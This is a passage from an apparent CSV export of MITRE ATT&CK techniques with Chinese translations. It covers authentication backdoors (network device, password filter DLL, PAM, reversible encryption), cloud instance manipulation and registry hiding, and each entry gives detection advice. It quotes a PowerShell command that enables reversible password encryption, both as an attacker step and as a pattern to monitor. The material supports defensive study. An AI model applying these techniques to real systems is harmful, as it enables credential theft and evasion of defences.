[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)",https://attack.mitre.org/techniques/T1556/004,19 October 2020,14 December 2021,2.0,"Credential Access, Defense Evasion, Persistence","Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)

Detection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601).",Network,File: File Modification,True,T1556,,,Administrator,,,,,,"(Citation: Mandiant - Synful Knock),(Citation: Cisco IOS Software Integrity Assurance - TACACS)",修改认证过程/修改身份验证流程：网络设备认证,攻击者可能使用 [补丁系统映像](https://attack.mitre.org/techniques/T1601/001) 在操作系统中硬编码密码，从而绕过网络设备上本地帐户的本地身份验证机制。 [修改系统映像](https://attack.mitre.org/techniques/T1601) 可能会在操作系统中植入代码，以便网络设备使用特定密码为攻击者提供访问权限。修改包括通过补丁植入操作系统映像的特定密码。在尝试验证时，插入的代码将首先检查用户输入的是否是密码。如果是，则授予访问权限。否则，植入的代码将传递凭据以验证潜在的有效凭据。（引用：Mandiant - Synful Knock）
T1556.002,Modify Authentication Process: Password Filter DLL,"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. 

Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. 

Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",https://attack.mitre.org/techniques/T1556/002,11 February 2020,20 April 2021,2.0,"Credential Access, Defense Evasion, Persistence","Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages</code>) and correlate then investigate the DLL files these files reference.

Password filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)",Windows,"File: File Creation, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1556,,Vincent Le Toux,"Administrator, SYSTEM",,,,,,"(Citation: Kaspersky ProjectSauron Full Report),",修改验证过程/修改身份验证流程：密码过滤器 DLL,攻击者可能会将恶意密码过滤器动态链接库 (DLL) 注册到身份验证过程中，以在验证用户凭据时获取它们。 Windows 密码过滤器是域和本地帐户的密码策略强制机制。过滤器作为 DLL 实现，其中包含根据密码策略验证潜在密码的方法。过滤器 DLL 可以放置在本地计算机上用于本地帐户和/或域控制器上用于域帐户。在安全帐户管理器 (SAM) 中注册新密码之前，本地安全机构 (LSA) 会要求对每个已注册的过滤器进行验证。在每个注册的过滤器都确认验证之前，任何潜在的更改都不会生效。攻击者可以注册恶意密码过滤器以从本地计算机和/或整个域中获取凭据。要执行正确的验证，过滤器必须从 LSA 接收纯文本凭据。每次发出密码请求时，恶意密码过滤器都会收到这些纯文本凭据。（引文：Carnal Ownage Password Filters Sept 2013）
T1556.003,Modify Authentication Process: Pluggable Authentication Modules,"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)

Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)

Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",https://attack.mitre.org/techniques/T1556/003,26 June 2020,17 October 2021,2.0,"Credential Access, Defense Evasion, Persistence","Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.

Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","Linux, macOS","File: File Modification, Logon Session: Logon Session Creation",True,T1556,,"George Allen, VMware Carbon Black; Scott Knight, @sdotknight, VMware Carbon Black",root,,,,,,"(Citation: ESET Ebury Oct 2017),(Citation: Trend Micro Skidmap),",修改认证过程/修改身份验证流程：可插拔认证模块,攻击者可能会修改可插拔身份验证模块 (PAM) 以访问用户凭据或启用对帐户的其他无根据的访问。 PAM 是一个由配置文件、库和可执行文件组成的模块化系统，可指导许多服务的身份验证。最常见的认证模块是<code>pam_unix.so</code>，它在<code>/etc/passwd</code>和<code>/etc/shadow</code中检索、设置和验证账户认证信息>.（引用：Apple PAM）（引用：Man Pam_Unix）（引用：Red Hat PAM）攻击者可能会修改 PAM 系统的组件以创建后门。 PAM 组件，例如 <code>pam_unix.so</code>，可以被修补以接受任意对手提供的值作为合法凭据。（引用：PAM 后门）对 PAM 系统的恶意修改也可能被滥用来窃取凭据。攻击者可能会使用代码感染 PAM 资源以获取用户凭据，因为与 PAM 组件交换的值可能是纯文本的，因为 PAM 不存储密码。（引文：PAM 凭据）（引文：Apple PAM）
T1556.005,Modify Authentication Process: Reversible Encryption,"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)

If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:

1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>
2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>
3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)
4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)

With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)

An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to ""Windows Server 2008"" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",https://attack.mitre.org/techniques/T1556/005,13 January 2022,10 February 2022,1.0,"Credential Access, Defense Evasion, Persistence","Monitor property changes in Group Policy: <code>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password Policy\Store passwords using reversible encryption</code>. By default, the property should be set to Disabled.

Monitor command-line usage for <code>-AllowReversiblePasswordEncryption $true</code> or other actions that could be related to malicious tampering of user settings (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)). Furthermore, consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such as <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>, that change account configurations. 

Monitor Fine-Grained Password Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)",Windows,"Active Directory: Active Directory Object Modification, Command: Command Execution, Script: Script Execution, User Account: User Account Metadata",True,T1556,,,"Administrator, User",,,,,,",(Citation: TechNet Least Privilege),(Citation: store_pwd_rev_enc),(Citation: TechNet Credential Theft),(Citation: Microsoft Securing Privileged Access)",修改认证过程/修改身份验证流程：可逆加密,攻击者可能会滥用 Active Directory 身份验证加密属性来访问 Windows 系统上的凭据。 <code>AllowReversiblePasswordEncryption</code> 属性指定是启用还是禁用帐户的可逆密码加密。默认情况下，此属性被禁用（而不是将用户凭据存储为单向散列函数的输出），除非旧版或其他软件需要，否则不应启用。（引用：store_pwd_rev_enc）如果启用该属性和/或用户更改他们的密码在启用后，攻击者可能能够获得启用属性后创建/更改的密码的明文。要解密密码，攻击者需要四个组件： 1. 来自 Active Directory 用户结构 <code>userParameters</code> 的加密密码 (<code>G$RADIUSCHAP</code>) 2. 16 字节随机生成的值(<code>G$RADIUSCHAPKEY</code>) 也来自 <code>userParameters</code> 3. 全局 LSA 密钥 (<code>G$MSRADIUSCHAPKEY</code>) 4. 远程访问子身份验证 DLL 中硬编码的静态密钥（<code>RASSFM.DLL</code>）利用此信息，攻击者可能能够复制加密密钥并随后解密加密的密码值。（引用：how_pwd_rev_enc_1）（引用：how_pwd_rev_enc_2）攻击者可以设置此属性通过本地组策略编辑器、用户属性、细粒度密码策略 (FGPP) 或 ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) 模块在各种范围内。例如，如果域功能级别设置为“Windows Server 2008”或更高版本，攻击者可能会实施 FGPP 并将其应用于用户或组。（引用：dump_pwd_dcsync）在 PowerShell 中，攻击者可以使用命令对用户设置进行相关更改类似于 <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>。
T1578,Modify Cloud Compute Infrastructure,"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.

Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",https://attack.mitre.org/techniques/T1578,30 August 2019,20 April 2021,1.1,Defense Evasion,"Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time or the mount of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",IaaS,"Instance: Instance Creation, Instance: Instance Deletion, Instance: Instance Metadata, Instance: Instance Modification, Instance: Instance Start, Instance: Instance Stop, Snapshot: Snapshot Creation, Snapshot: Snapshot Deletion, Snapshot: Snapshot Metadata, Snapshot: Snapshot Modification, Volume: Volume Creation, Volume: Volume Deletion, Volume: Volume Metadata, Volume: Volume Modification",False,,,,User,,,,,,",(Citation: Mandiant M-Trends 2020)",修改云计算基础设施,攻击者可能会尝试修改云帐户的计算服务基础设施以逃避防御。对计算服务基础设施的修改可以包括创建、删除或修改一个或多个组件，例如计算实例、虚拟机和快照。通过修改基础架构组件获得的权限可能会绕过阻止访问现有基础架构的限制。修改基础设施组件还可能允许对手逃避检测并删除其存在的证据。（引用：Mandiant M-Trends 2020）
T1578.002,Modify Cloud Compute Infrastructure: Create Cloud Instance,"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)

Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",https://attack.mitre.org/techniques/T1578/002,14 May 2020,08 March 2021,1.1,Defense Evasion,"The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.

In AWS, CloudTrail logs capture the creation of an instance in the <code>RunInstances</code> event, and in Azure the creation of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances create</code> to create a VM.(Citation: Cloud Audit Logs)",IaaS,"Instance: Instance Creation, Instance: Instance Metadata",True,T1578,,,User,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Mandiant M-Trends 2020)",修改云计算基础设施：创建云实例,攻击者可能会在云帐户的计算服务中创建新实例或虚拟机 (VM) 以逃避防御。创建新实例可能会允许攻击者绕过当前驻留在帐户中的实例上存在的防火墙规则和权限。攻击者可以[创建快照](https://attack.mitre.org/techniques/T1578/001) 帐户中的一个或多个卷，创建新实例，挂载快照，然后应用限制较少的安全策略收集 [来自本地系统的数据](https://attack.mitre.org/techniques/T1005) 或用于 [远程数据暂存](https://attack.mitre.org/techniques/T1074/002)。(引文: Mandiant M-Trends 2020）创建新实例还可能允许对手在环境中执行恶意活动，而不会影响当前正在运行的实例的执行。
T1578.001,Modify Cloud Compute Infrastructure: Create Snapshot,"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.

An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)",https://attack.mitre.org/techniques/T1578/001,09 June 2020,08 March 2021,1.1,Defense Evasion,"The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.

In AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details.(Citation: AWS Cloud Trail Backup API).

In Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs.(Citation: Azure - Monitor Logs)

Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the <code>gcloud compute instances create</code> command to create a new VM disk from a snapshot.(Citation: Cloud Audit Logs) It is also possible to detect the usage of the GCP API with the <code>""sourceSnapshot"":</code> parameter pointed to <code>""global/snapshots/[BOOT_SNAPSHOT_NAME]</code>.(Citation: GCP - Creating and Starting a VM)",IaaS,"Snapshot: Snapshot Creation, Snapshot: Snapshot Metadata",True,T1578,,Praetorian,User,,,,,,",(Citation: Mandiant M-Trends 2020)",修改云计算基础设施：创建快照,攻击者可能会在云帐户中创建快照或数据备份以逃避防御。快照是现有云计算组件（例如虚拟机 (VM)、虚拟硬盘驱动器或卷）的时间点副本。攻击者可以利用权限创建快照，以绕过阻止访问现有计算服务基础架构的限制，这与 [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) 中的攻击者不同可能会恢复为快照以逃避检测并删除其存在的证据。攻击者可以[创建云实例](https://attack.mitre.org/techniques/T1578/002)，将一个或多个创建的快照挂载到该实例，然后应用允许攻击者访问创建的实例的策略，例如允许他们入站和出站 SSH 访问的防火墙策略。（引用：Mandiant M-Trends 2020）
T1578.003,Modify Cloud Compute Infrastructure: Delete Cloud Instance,"An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.

An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)",https://attack.mitre.org/techniques/T1578/003,16 June 2020,08 March 2021,1.1,Defense Evasion,"The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.

In AWS, CloudTrail logs capture the deletion of an instance in the <code>TerminateInstances</code> event, and in Azure the deletion of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances delete</code> to delete a VM.(Citation: Cloud Audit Logs)",IaaS,"Instance: Instance Deletion, Instance: Instance Metadata",True,T1578,,,User,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Mandiant M-Trends 2020)",修改云计算基础设施：删除云实例,攻击者可能会在执行恶意活动后删除云实例，以试图逃避检测并删除其存在的证据。如果实例不可恢复，删除实例或虚拟机可以删除有价值的取证工件和其他可疑行为证据。攻击者也可以 [创建云实例](https://attack.mitre.org/techniques/T1578/002) 并在实现其目标后终止实例。（引用：Mandiant M-Trends 2020）
T1578.004,Modify Cloud Compute Infrastructure: Revert Cloud Instance,"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.

Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",https://attack.mitre.org/techniques/T1578/004,16 June 2020,08 March 2021,1.1,Defense Evasion,"Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",IaaS,"Instance: Instance Metadata, Instance: Instance Modification, Instance: Instance Start, Instance: Instance Stop",True,T1578,,Netskope,User,,,,,,",",修改云计算基础架构：还原云实例,攻击者在执行恶意活动以试图逃避检测并删除其存在的证据后，可能会恢复对云实例所做的更改。在高度虚拟化的环境中，例如基于云的基础设施，这可以通过云管理仪表板或云 API 恢复虚拟机 (VM) 或数据存储快照来完成。该技术的另一个变体是利用附加到计算实例的临时存储。大多数云提供商提供各种类型的存储，包括持久性、本地和/或临时性，这些临时性类型通常在 VM 停止/重新启动时重置。（引用：Tech Republic - 恢复 AWS 快照）（引用：谷歌 - 恢复云快照)
T1112,Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.

Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.

Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)

The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.",https://attack.mitre.org/techniques/T1112,31 May 2017,13 August 2020,1.2,Defense Evasion,"Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.

Monitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

Monitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).",Windows,"Command: Command Execution, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification",False,,Host forensic analysis,"Bartosz Jerzman; David Lu, Tripwire; Travis Smith, Tripwire","Administrator, SYSTEM, User",,,CAPEC-203,,,"(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: FireEye APT32 May 2017),(Citation: Cybereason Valak May 2020),(Citation: US-CERT BADCALL),(Citation: Fidelis njRAT June 2013),(Citation: ESET Gamaredon June 2020),(Citation: Trend Micro Waterbear December 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: McAfee Sodinokibi October 2019),(Citation: FoxIT Wocao December 2019),(Citation: CME Github September 2018),(Citation: Cylance Sodinokibi July 2019),(Citation: ESET RTM Feb 2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: CISA AA20-301A Kimsuky),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Arxiv Avaddon Feb 2021),(Citation: Unit 42 Inception November 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Group IB Ransomware September 2020),(Citation: Symantec Waterbug Jun 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: TrendMicro Netwalker May 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Symantec Hydraq Jan 2010),(Citation: Medium Metamorfo Apr 2020),(Citation: Talos Lokibot Jan 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Accenture HyperStack October 2020),(Citation: KISA Operation Muzabi),(Citation: Trend Micro DRBControl February 2020),(Citation: Intel 471 REvil March 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: Qualys Hermetic Wiper March 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: ProofPoint Ursnif Aug 2016),(Citation: Trustwave Pillowmint June 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: CIRCL PlugX March 2013),(Citation: Cybereason Clop Dec 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Tarrask scheduled task),(Citation: Unit 42 Valak July 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: McAfee Night Dragon),(Citation: ESET PipeMon May 2020),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: McAfee Shamoon December 2018),(Citation: Symantec Volgmer Aug 2014),(Citation: ESET TeleBots Oct 2018),(Citation: Symantec Naid June 2012),(Citation: Profero APT27 December 2020),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: CERT-EE Gamaredon January 2021),(Citation: GitHub QuasarRAT),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye APT28),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: PaloAlto NanoCore Feb 2016),(Citation: IBM MegaCortex),(Citation: Bitdefender APT28 Dec 2015),(Citation: AADInternals Documentation),(Citation: CrowdStrike Grim Spider May 2019),(Citation: CERT-FR PYSA April 2020),(Citation: BlackBerry Amadey 2020),(Citation: McAfee Honeybee),(Citation: ESET Grandoreiro April 2020),(Citation: US-CERT TA18-074A),(Citation: Microsoft Reg),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Red Canary NETWIRE January 2020),(Citation: Symantec Catchamas April 2018),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Symantec Darkmoon Aug 2005),(Citation: TrendMicro Patchwork Dec 2017),(Citation: ESET LoJax Sept 2018),(Citation: Malwarebytes Konni Aug 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Unit 42 QUADAGENT July 2018),(Citation: CISA ComRAT Oct 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Medium KONNI Jan 2020),(Citation: Secureworks REvil September 2019),(Citation: ESET Turla Mosquito Jan 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Microsoft NICKEL December 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Check Point Warzone Feb 2020),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Group IB APT 41 June 2021),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: ESET ComRAT May 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Trend Micro njRAT 2018),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: FOX-IT May 2016 Mofang),(Citation: Talos ZxShell Oct 2014),(Citation: Group IB Silence Sept 2018),(Citation: Talos Kimsuky Nov 2021),(Citation: Prevailion EvilNum May 2020),(Citation: Korean FSI TA505 2020),(Citation: FireEye SMOKEDHAM June 2021),(Citation: ESET Dukes October 2019),(Citation: Cylance Shell Crew Feb 2017),(Citation: SANS Conficker),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: SentinelOne Valak June 2020),(Citation: US-CERT Bankshot Dec 2017),(Citation: Check Point Sunburst Teardrop December 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Talos TinyTurla September 2021),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro DarkComet Sept 2014),(Citation: ESET Gelsemium June 2021),(Citation: Rancor Unit42 June 2018),(Citation: Red Canary Qbot),(Citation: NCC Group WastedLocker June 2020),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: FireEye APT30),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Symantec Nerex May 2012),(Citation: RedCanary Mockingbird May 2020),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Gh0stRAT ATT March 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: Kaspersky WIRTE November 2021),(Citation: FireEye Shamoon Nov 2016),(Citation: FireEye APT41 Aug 2019),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: FireEye FELIXROOT July 2018),(Citation: ESET Casbaneiro Oct 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: FireEye APT38 Oct 2018),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: ESET Attor Oct 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Palo Alto Rover),(Citation: ESET GreyEnergy Oct 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Riskiq Remcos Jan 2018),(Citation: Trend Micro Conficker),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: DigiTrust NanoCore Jan 2017),(Citation: Kaspersky Regin),(Citation: SentinelLabs Agent Tesla Aug 2020),",修改注册表,攻击者可能会与 Windows 注册表交互以隐藏注册表项中的配置信息、删除信息作为清理的一部分或作为其他技术的一部分以帮助持久性和执行。对注册表特定区域的访问取决于帐户权限，有些需要管理员级别的访问权限。内置的 Windows 命令行实用程序 [Reg](https://attack.mitre.org/software/S0075) 可用于本地或远程注册表修改。 （引用：Microsoft Reg）也可以使用其他工具，例如远程访问工具，它可能包含通过 Windows API 与注册表交互的功能。注册表修改还可能包括隐藏键的操作，例如在键名前添加空字符，这将导致错误和/或在通过 [Reg](https://attack.mitre.org/software/S0075) 读取时被忽略) 或其他使用 Win32 API 的实用程序。 （引用：Microsoft Reghide NOV 2006）攻击者可能会滥用这些伪隐藏密钥来隐藏用于保持持久性的有效负载/命令。 